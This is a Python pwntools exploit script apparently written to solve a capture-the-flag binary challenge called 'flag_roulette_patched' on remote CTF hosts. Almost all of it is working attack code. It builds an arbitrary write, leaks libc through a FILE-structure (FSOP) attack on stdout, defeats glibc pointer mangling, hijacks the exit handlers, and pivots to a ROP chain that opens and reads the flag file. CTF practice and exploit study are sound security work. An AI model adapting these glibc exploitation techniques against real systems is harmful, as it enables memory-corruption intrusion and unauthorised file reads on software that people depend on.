#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host worker01.gcc-ctf.com --port 11179 ./flag_roulette_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./flag_roulette_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'worker03.gcc-ctf.com'
port = int(args.PORT or 11877)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
#br exit
continue
#br *__run_exit_handlers+339
#c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def prompt(m,prefix=b"> "):
    io.sendlineafter(prefix,m)

def prompti(i,prefix=b"> "):
    prompt(str(i).encode(),prefix=prefix)

def cmd(i):
    prompti(i)

def printx(**kwargs):
    for k,v in kwargs.items():
        log.info(f"{k}: 0x{v:x}")

def place_bet(sz,idx,v):
    cmd(1)
    prompti(sz)
    prompti(idx)
    prompti(v)

def delete_bet():
    cmd(2)

def arbw(addr,value,offset=0):
    place_bet(0x21000,addr-offset,value)
    delete_bet()

def rol(v,n=17):
    return ((v << n)&(2**64 -1)) | (v >> (64 - n))

def arbw_seq(addr,buff,offset):
    for i in range(len(buff)):
        arbw(addr+i,buff[i],offset=offset)

libc = exe.libc # note: previously unstripped
io = start()

# disable dyn updates to mmap chunk size threshold
mp_no_dyn_thresh = 0x1f8398
arbw(mp_no_dyn_thresh,1)

# leak libc with FSOP
stdout_offset = 0x1f8770 + 0x1000 # stdout->_flags
fsop_offset = 0x1f8790 + 0x1000 # stdout->_IO_write_base
arbw(stdout_offset+1,0x38)
place_bet(0x21000,fsop_offset+1,0x47)
io.recv(5)
leak=u64(io.recv(8))
if(leak & 0xfff == 0x280):
    libc.address = leak -0x148280
else:
    libc.address = leak - 0x1d4780
bet = libc.address - 0x24ff0
printx(leak=leak,libc=libc.address,bet=bet)
delete_bet()

# __exit_funcs into rop
r14 = libc.sym.__exit_funcs # set by __run_exit_handlers
rbx = libc.sym.__exit_funcs_lock # ...

cookie = libc.address - 0x2890 # PTR_MANGLE cookie
exit_entry = libc.address + 0x1d5318 # mangled function pointer called by __run_exit_handlers

buffer = libc.address + 0x1d3900 # does not really matter, just need to be rw and not used
new_stack = buffer + 0x1000

pivot = libc.sym.setcontext+53
gadget = libc.sym.__GI__IO_puts+114 # rdx <- rbx then call [r14+0x38]
pop_rdi_ret = libc.address + 0x0000000000027c65
pop_rsi_ret = libc.address + 0x0000000000029419
pop_rdx_ret = libc.address + 0x00000000000fd6bd
pop_rcx_ret = libc.address + 0x0000000000036bbb

SYS_read = 0x0
SYS_write = 0x1
SYS_open = 0x2

def syscall(rax,rdi,rsi,rdx):
    return [pop_rdi_ret,rax,pop_rsi_ret,rdi,pop_rdx_ret,rsi,pop_rcx_ret,rdx,libc.sym.syscall]

rc = []
rc += syscall(SYS_read,0,buffer,0x100)
rc += syscall(SYS_open,buffer,0,0)
rc += syscall(SYS_read,3,buffer,0x100)
rc += syscall(SYS_write,1,buffer,0x100)
rc = b"".join([p64(g) for g in rc])

arbw_seq(cookie,p64(0),bet) # bypass pointer mangling
arbw_seq(exit_entry,p64(rol(gadget,17)),bet) # rdx control + call [r14+0x38]

arbw_seq(r14+0x38,p64(pivot),bet) # setcontext gadget
arbw_seq(rbx+0xa0,p64(new_stack)+p64(pop_rdi_ret+1),bet) # new rsp and return address for setcontext gadget

arbw_seq(new_stack,rc,bet) # rop chain

# exit
place_bet(200,0,0) # need bet to exit
cmd(3)
sleep(1)
io.sendline(b"/flag\0")
log.info(io.recvuntil(b"}"))

io.close()

